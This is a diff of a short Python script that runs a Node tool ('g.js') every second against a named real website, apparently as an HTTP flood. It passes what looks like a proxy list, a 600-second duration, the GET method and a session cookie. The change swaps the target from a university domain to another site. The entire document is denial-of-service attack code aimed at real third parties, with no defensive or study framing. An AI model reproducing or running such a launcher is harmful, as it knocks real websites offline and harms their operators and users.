@@ -3,10 +3,10 @@ import time
 import os
 import sys
 
-os.system('node g.js http://uve.usep.edu.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')
+os.system('node g.js http://dcc-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')
 
 def job():
-    os.system('node g.js http://uve.usep.edu.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')
+    os.system('node g.js http://dcc-essentiel.ckgroup.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')
     
 schedule.every(1).seconds.do(job)
 
